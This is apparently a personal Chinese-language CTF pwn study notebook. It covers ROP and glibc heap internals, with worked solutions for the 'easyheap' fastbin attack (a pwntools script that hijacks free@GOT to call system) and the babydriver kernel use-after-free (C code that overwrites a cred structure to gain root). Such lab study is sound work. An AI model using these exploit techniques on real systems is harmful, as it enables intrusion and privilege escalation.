## 0 资料存档

Linux 64位传参：
`rdi`：第一个参数；`rsi`：第二个参数；`rdx`：第三个参数；`rcx`：第四个参数
`r8`：第五个参数；`r9`：第六个参数

Win 64位：
第1参数`rcx`；第2参数`rdx`；第3参数`r8`；第4参数`r9`

32位传参：
栈：第一个参数最后压栈，最后一个参数最先压栈。

int64 = 8xchar

sig存档：
https://github.com/push0ebp/sig-database

```cmd
cd D:\Phoexina\IDA_Pro_v8.3_Portable\IDA83_SDK_TOOLS\flair83\bin\win

pelf libc.a 1.pat
sigmake 1.pat 1.sig
```


普通查看命令
```bash
file easyheap
checksec --file=easyheap
#看段，很长
readelf -a easyheap
```

查看libc版本
```bash
$ dpkg -l | grep libc6
ii  libc6:amd64                2.40-3                 amd64        GNU C Library: Shared libraries
...
```

PLT@GOT表
1. 程序调用 `printf`，跳转到 `printf@PLT`。
2. `printf@PLT` 的代码会跳转到 `printf@GOT`。
3. 如果是第一次调用，`printf@GOT` 指向动态链接器的解析代码。
4. 动态链接器解析 `printf` 的实际地址，并将其写入 `printf@GOT`。
5. 动态链接器返回，程序跳转到 `printf` 的实际地址。
6. 后续调用时，`printf@GOT` 已经存储了 `printf` 的实际地址，程序直接跳转到该地址。

call -> plt ->`[got]`=so-func
一般需要信息泄露的是动态库地址，也就是`[got]`


动态改exit的got表
静态编译可以改fini_array
https://www.mrskye.cn/archives/2a024eda/#libc-csu-fini-%E5%87%BD%E6%95%B0

格式化： https://www.cnblogs.com/VxerLee/p/16398761.html


内存保护
![](../images/Pasted%20image%2020241108151756.png)
### ASLR
https://blog.csdn.net/counsellor/article/details/81543197
- 0 = 关闭
- 1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）
- 2 = 全随机。除了1中所述，还有heap。
ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责。但是只有在开启 ASLR 之后，PIE 才会生效。
### PIE
PIE 使得可执行文件的代码可以在内存中的任意地址运行，而不是依赖于固定的加载地址。
这种特性使得程序在每次执行时都可以被加载到不同的内存地址。
**编译时选项**：`-fPIE` 和 `-pie`
PIE 是地址空间布局随机化（ASLR）的一部分，能够有效防止许多常见的攻击方式，如缓冲区溢出和返回导向编程（ROP）攻击。由于程序的代码在每次执行时都可能位于不同的地址，攻击者很难预测代码的位置，从而降低了利用漏洞的成功率。


## 1 栈溢出

https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/

### 1.1 小技巧

#### 1.1.1 信息泄露

格式化字符串漏洞：canary
https://www.cnblogs.com/VxerLee/p/16398761.html
https://www.yijinglab.com/specialized/20240218161621
https://yichen115.github.io/2020/03/21/aedgn4/#hijack-GOT

Stack smash？
这个描述和用格式化字符串泄露内容好像哦
![](../images/Pasted%20image%2020250227103125.png)

#### 1.1.2 栈劫持frame faking

通过leave进行栈劫持
NSSCTF的最后一题 不可名状的东西 做过了

#### 1.1.3 没做过的堆栈旋转&部分重写

stack pivoting
看起来很特别可以做一下 https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting
![](../images/Pasted%20image%2020250227102904.png)


栈上的 partial overwrite
没太看懂，可以做一下   2018 - 安恒杯 - babypie

### 1.2 基础ROP

ret2text：朴素的跳转
ret2shellcode：那道年赛题应该是这个，通过ROP把代码段设置为可执行，然后
ret2libc：要算基址

### 1.3 中级ROP

ret2csu：感觉如果只是充分利用gadgets应该是做过了（？
利用 x64 下的 `__libc_csu_init` 中的 gadgets
ret2reg：没做过
查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址。reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)

### 1.4 高级ROP

ret2dlresolve：当时是模仿这个给’/bin/sh‘写到了bss里面，好像很相似，修改动态字符串表 `.dynstr`
实际上应该复杂一些，可以写一下

ret2VDSO

SROP


## 2 堆溢出

很好的学习：
https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/
### 2.1 简单理解

理解一下linux的堆
据说本质上libc自己实现的堆，相比win系统的似乎会不安全很多
（也就是更换libc库来运行进程，可能会有不一样的分配效果？）

我尝试了分配一次20大小，再释放，然后再分配了300大小的
第一次分配地址是0x6032a0，第二次分配的地址是0x6032c0

第一次分配释放后被放入了tcachebins

`tcachebins` 是 glibc 从 2.26 版本开始引入的一种线程本地缓存机制，用于优化小块内存的分配和释放。它的主要目的是减少线程之间的锁竞争，提高多线程程序的性能。
- **分配内存**：当程序请求分配小块内存时，首先检查对应的 `tcachebins` 是否有可用块。如果有，则直接从 `tcachebins` 中取出一个块。
- **释放内存**：当程序释放小块内存时，优先将其放入 `tcachebins`，如果 `tcachebins` 已满，则将块转移到 `fastbins` 或 `unsorted bins`。
- **线程本地缓存**：每个线程都有自己的 `tcachebins`，因此线程之间不会竞争锁。
- **管理小块内存**：`tcachebins` 主要用于管理小块内存（通常是 0x20 到 0x410 字节的块，具体大小取决于 glibc 的实现）。
- **链表结构**：`tcachebins` 是一个单链表，每个 bin 存储相同大小的内存块。
- **数量限制**：每个 bin 中的块数量是有限的（默认最多 7 个块，具体取决于 glibc 的配置）。
- **优先级高于 fastbins**：当 `tcachebins` 可用时，分配和释放小块内存会优先使用 `tcachebins`。

`fastbins` 是 glibc 中的一种快速分配机制，用于管理小块内存。它在 `tcachebins` 引入之前是主要的快速分配机制，但在 glibc 2.26 之后，`fastbins` 的优先级被降低。
- **分配内存**：当程序请求分配小块内存时，如果 `tcachebins` 不可用或未启用，则会检查 `fastbins` 是否有可用块。如果有，则直接从 `fastbins` 中取出一个块。
- **释放内存**：当程序释放小块内存时，如果 `tcachebins` 未启用或不可用，则将块放入 `fastbins`。
- **全局缓存**：`fastbins` 是全局的，而不是线程本地的，因此多个线程可能会竞争锁。
- **管理小块内存**：`fastbins` 主要用于管理小块内存（通常是 0x20 到 0x80 字节的块，具体大小取决于 glibc 的实现）。
- **链表结构**：`fastbins` 是一个单链表，每个 bin 存储相同大小的内存块。
- **无合并操作**：当内存块被释放到 `fastbins` 时，不会立即尝试与相邻的空闲块合并。
**缺点：** 因为 `fastbins` 是全局的，所以在多线程环境中可能会导致锁竞争。不会立即合并空闲块，可能导致内存碎片化

#### 2.1.1 高版本

这次我使用的是2.35 
总之分配释放后，并没合并之类，而是把这个放入了线程cache表
已释放的旧chunk：0x603290~0x6032b0，chunk会有16字节的头（prev，size）
刚分配的新chunk：0x6032b0~0x6033e0，使用首地址0x6032c0，chunk只有8字节的头，但前面似乎有补位（或者也可以叫16字节？null，size这样？）

![](../images/Pasted%20image%2020250226165110.png)

再释放一次看看，将新chunk释放，看起来并不是一个链表，至少chunk上看不到下一个
![](../images/Pasted%20image%2020250226172003.png)

#### 2.1.2 低版本

换一个libc试试，这个是2.23的
很好确实变了
分配了两次，释放了最后分配的
chunk本身好像没什么，头就是size
和之前的区别是释放后放入的是fastbins

![](../images/Pasted%20image%2020250226175110.png)


**fd（Forward Pointer）**
- **大小**：8 字节（64 位系统）或 4 字节（32 位系统）。
- **作用**：指向链表中下一个空闲 chunk 的地址。
- **用途**：用于维护空闲链表（如 `fastbins` 或 `unsorted bins`）。
- 在堆利用中，`fd` 是一个非常重要的字段，因为它可以被攻击者篡改，从而实现任意地址写入等漏洞利用。
![](../images/Pasted%20image%2020250226180246.png)

### 2.1 fastbins attack

题目参考：
https://www.freebuf.com/articles/endpoint/371095.html
https://blog.csdn.net/Y_peak/article/details/121364088
![](../images/Pasted%20image%2020250226200518.png)

调试断点：
menu
malloc
free
![](../images/Pasted%20image%2020250227091502.png)


利用方式：
通过溢出，修改fastbins的下一个fd，分配时会优先分配fastbins
于是分配过真实内存后，下次分配会使用修改过的fastbins地址，本题中是用来修改heap_array中的地址
heap 0 溢出用； heap 1 fd被修改；heap 2 heap_array中的地址

通过修改heap2，修改heap0的地址
heap 0 free的got表->free； heap 1 fd被修改；heap 2 heap_array中的地址

通过修改heap0，修改free的got表存的的地址，指向system的plt地址
heap 0 free的got表->system； heap 1 fd被修改；heap 2 heap_array中的地址

修改heap 1内容作为传参：/bin/sh
heap 0 free的got表->system； heap 1 ->'/bin/sh'；heap 2 heap_array中的地址

调用free(heap1) =>system('/bin/sh')

![](../images/Pasted%20image%2020250226190945.png)

需要注意，如果是用高版本Linux中指定低版本库运行，这里启动的system虽然启动成功，但是无法执行命令
因为命令的可执行文件依赖高版本库
![](../images/Pasted%20image%2020250226203143.png)

补了一些解析

```python
context(log_level = 'debug', arch = 'amd64', os = 'linux')  
  
elf = ELF("/home/phoexina/ctf/easyheap")  
  
system_plt = elf.plt['system']  
print(hex(system_plt))  
free_got = elf.got['free']  
print(hex(free_got))  
my_array_addr = elf.symbols['heaparray']  
print(hex(my_array_addr))  
  
#node5.buuoj.cn:26612  
p = remote('node5.buuoj.cn', 26612)  
  
#heap 0  
p.sendafter('Your choice :', b'1\n')  
p.sendafter('Size of Heap : ', b'96\n')  
p.sendafter('Content of heap:', b'aaaa\n')  
  
p.sendafter('Your choice :', b'1\n')  
p.sendafter('Size of Heap : ', b'96\n')  
p.sendafter('Content of heap:', b'bbbb\n')  
  
#释放heap 1  
p.sendafter('Your choice :', b'3\n')  # free 1  
p.sendafter('Index :', b'1\n')  
  
#溢出到fastbins的heap 1  
#0x6020ad  
payload = p64(0x0) * 13 + p64(0x71) + p64(0x6020ad) + p64(0x0)  
p.sendafter('Your choice :', b'2\n')  
p.sendafter('Index :', b'0\n')  
p.sendafter('Size of Heap : ', b'1000\n')  
p.sendafter('Content of heap : ', payload)  
  
#再申请heap 1  
p.sendafter('Your choice :', b'1\n')  
p.sendafter('Size of Heap : ', b'96\n')  
p.sendafter('Content of heap:', b'\n')  
  
#将0x6020bd分配为heap 2  
#readelf -a easyheap |grep heap 可以看到  
#78: 00000000006020e0    80 OBJECT  GLOBAL DEFAULT   26 heaparray  
p.sendafter('Your choice :', b'1\n')  
p.sendafter('Size of Heap : ', b'96\n')  
p.sendafter('Content of heap:', b'\n')  
  
#修改heap 2，heaparry的首地址(heap 0)变成free的got表，可以将free的动态库地址改成system  
payload = b'a' * 35 + p64(free_got)  
p.sendafter('Your choice :', b'2\n')  
p.sendafter('Index :', b'2\n')  
p.sendafter('Size of Heap : ', b'1000\n')  
p.sendafter('Content of heap : ', payload)  
  
#将free的动态库地址改成system  
p.sendafter('Your choice :', b'2\n')  
p.sendafter('Index :', b'0\n')  
p.sendafter('Size of Heap : ', b'1000\n')  
p.sendafter('Content of heap : ', p64(system_plt))  
  
#heap 1修改内存为的sh命令  
binsh = b'cat /flag\x00'  
p.sendafter('Your choice :', b'2\n')  
p.sendafter('Index :', b'1\n')  
p.sendafter('Size of Heap : ', b'1000\n')  
p.sendafter('Content of heap : ', binsh)  
  
#调用free(addr)->system('/bin/sh')  
p.sendafter('Your choice :', b'3\n')  
p.sendafter('Index :', b'1\n')  
  
p.close()
```

### 2.2 kernel uaf

> [!info] 
> 参考：
> https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/
> https://beafb1b1.github.io/kernel/ciscn_2017_babydriver_UAF/ 

试着直接 `sudo ./boot.sh` 启动一下
![](../images/Pasted%20image%2020250228101927.png)

内核版本，权限，设备号
```
/ $ uname -a
Linux (none) 4.4.72 #1 SMP Thu Jun 15 19:52:50 PDT 2017 x86_64 GNU/Linux
/ $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/ $ cat /proc/devices |grep baby
248 babydev
```

理解一下，存在一个文件flag只有root权限能读，进去的权限是ctf
存在一个取得/lib/modules/4.4.72/babydriver.ko，使用设备/dev/babydev
通过读写设备造成内核堆溢出，来提权

打开qemu后好像没有什么方式能拷贝文件，可以在外面单独解压文件系统
这里的rootfs.cpio是gz压缩状态的

```shell
cp rootfs.cpio ./rootfs
mv rootfs.cpio rootfs.cpio.gz
gunzip ./rootfs.cpio.gz
cpio -idmv < rootfs.cpio
```

![](../images/Pasted%20image%2020250228104755.png)


看起来是很朴素的驱动，只有基础的函数
![](../images/Pasted%20image%2020250228105550.png)


babyinit：创建了一个字符设备，设备号是248
babyexit：注销
babyopen：为babydev_struct.device_buf分配内存，size为64
babyrelease：释放babydev_struct.device_buf的内存，babydev_struct.device_buf不为空
babyioctl：释放内存，重新分配指定大小内存
read和write就是普通的读写

理解一下，释放后使用

babyopen dev0分配内存0-64
babyopen dev1分配内存1-64
babyioctl dev1释放内存1-64，重新分配内存2-a8
babyrelease dev1释放内存2-a8

此时驱动中还保存着内存2-a8的指针
申请cred结构体，正好使用内存2-a8

babyopen dev0读写，操作内存2-a8


> [!fail] 
> 【这里的符号表没有调试符号！！！！】
> 开始调试，要加载符号表，要提取vmlinux（看到这个就头疼xxxx
> 好在我已经不是那个到处找内网能用的源还要配版本的开发了0v0，题目都是给image的感动-v-
> （咦？其实以前crash用的vmlinux也是符号表的，那image是什么呢）
> 只需要搞到脚本就好了，直接从内核源码下载就可以！好像版本都不需要完全匹配
> https://github.com/torvalds/linux/blob/v4.14/scripts/extract-vmlinux 
> `chmod 777 extract-vmlinux`
> `./extract-vmlinux bzImage > vmlinux`
> 
> 这个部分没有意义捏，获取有符号表的太困难了和开发的时候获取应该是一样的
> 对我们来说应该没必要，可以看IDA理解call的是什么（


先写一个用到babydev的程序
这里ioctl的cmd值是0x10001
![](../images/Pasted%20image%2020250304113807.png)


qemu里面没法编译，试图挂载共享目录来拷贝但是没有root没法挂载，只好替换文件系统了

```
gcc test.c -static -o test
find . | cpio -o --format=newc > ../rootfs.cpio
```

可以调试了 `cat /sys/module/babydriver/sections/.text` 查看驱动地址
来导入ko的符号`add-symbol-file babydriver.ko 0xffffffffc0000000`
但反正内核也没有符号了，这个看IDA就能对应了-,-

打开pwndbg，链接后继续，启动后给open放上断点
不启动就断点会出问题
```
target remote localhost:1234
c
b *0xffffffffc0000030
```

给我的gui加了ctrlc中断信号，调试了一下

open分配 `0xffff880002740e00 —▸ 0xffff880002740840 —▸ 0xffff880002740880 —▸ 0xffff8800027408c0 —▸ 0xffff880002740b00 ◂— ...`
ioctl释放后，内存好像没有变化，再分配 `0xffff880000a16480 —▸ 0xffff880000a16540 ◂— 0`
release释放，特意观察了一下前缀，好像也没有什么变化。

搜索了一下
open的分配是：`kmem_cache_alloc_trace(kmalloc_caches[6],0x24000C0LL,0x40LL)`
这个函数是内核中用于分配内存的函数，它会追踪内存分配的情况
`kmalloc_caches` 是内核中的一个缓存池数组，通常不同的索引对应不同的内存块大小，索引 6 通常对应 64 字节大小的内存块
0x24000C0，包含多个标志位，`GFP_KERNEL | __GFP_ZERO | ...`
`0x40` = 64 字节

而ioctl里面就是普通的kmalloc，可以write一下看看区别
`0xffff880000a30ac0`写入后就是这个地址
![](../images/Pasted%20image%2020250305141543.png)
释放后马上变回指针，看起来像是一个双向链表（
![](../images/Pasted%20image%2020250305141617.png)
kmalloc分配的
![](../images/Pasted%20image%2020250305141722.png)
就没什么特别的，也没有前缀
看来这道题是学不到什么内存管理了（

看一下cred结构体
也就是修改这些
```c
struct cred {
    atomic_t    usage;                                  //02     4字节
    kuid_t      uid;        /* real UID of the task */  //0x03e8 8字节
    kgid_t      gid;        /* real GID of the task */  //0x03e8 12字节
    kuid_t      suid;       /* saved UID of the task */ //0x03e8 16字节
    kgid_t      sgid;       /* saved GID of the task */ //0x03e8 到这里是20字节
    ......
}
```


```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //close
#include <fcntl.h> //open
#include <sys/ioctl.h>
#include <sys/wait.h>

int main() {
	int fd = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);
	ioctl(fd, 0x10001, 0xa8);
	write(fd, "HelloWorld", 11);
	close(fd);
	
	char buf[20] = {0};
	
	printf("now:pid=%d ppid=%d, uid=%d\n", getpid(), getppid(),getuid());
	
	if(fork()==0){
		read(fd, buf, 20);
		for (int i = 0; i < 20; i++) {  
    		printf("%02x ", (unsigned char)buf[i]);  
		}  
		printf("\n"); 
		printf("fork:pid=%d ppid=%d, uid=%d\n", getpid(), getppid(),getuid());
		system("cat /flag");
		exit(0);
	}
	
	wait(NULL);
	return 0;

}
```

在驱动的read处断点，但是read似乎没有被断到
是在第二个设备打开的close的断点可以看到这个内存确实变成结构体了
![](../images/Pasted%20image%2020250305145025.png)
![](../images/Pasted%20image%2020250305145516.png)

很好，read的fd写错了（
修改以后就ok了
![](../images/Pasted%20image%2020250305145649.png)

把修改加上

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //close
#include <fcntl.h> //open
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <string.h>

int main() {
	int fd = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);
	ioctl(fd, 0x10001, 0xa8);
	write(fd, "HelloWorld", 11);
	close(fd);
	
	char buf[20] = {0};
	
	printf("now:pid=%d ppid=%d, uid=%d\n", getpid(), getppid(),getuid());
	
	if(fork()==0){
		read(fd2, buf, 20);
		for (int i = 0; i < 20; i++) {  
    			printf("%02x ", (unsigned char)buf[i]);  
		}
		printf("\n");
		
		memset(buf+4, 0, 16);
		
		write(fd2, buf, 20);
		
		printf("fork:pid=%d ppid=%d, uid=%d\n", getpid(), getppid(),getuid());
		system("cat /flag");
		exit(0);
	}
	
	wait(NULL);
	close(fd2);
	
	return 0;

}

```

![](../images/Pasted%20image%2020250305150147.png)
很遗憾这题没有靶场。